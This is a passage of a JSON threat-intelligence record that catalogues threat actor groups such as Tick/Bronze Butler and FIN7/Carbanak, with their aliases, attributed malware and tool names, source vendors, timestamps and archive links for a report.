            "tools": [
                "Carbanak",
                "Mimikatz",
                "PsExec",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041817,
    "ts_creation_date": 1483164253,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/35f1522128ae21490cc812f5929b961fe0cbdf5c.pdf",
        "text": "https://archive.orkl.eu/35f1522128ae21490cc812f5929b961fe0cbdf5c.txt",
        "img": "https://archive.orkl.eu/35f1522128ae21490cc812f5929b961fe0cbdf5c.jpg"
    }
}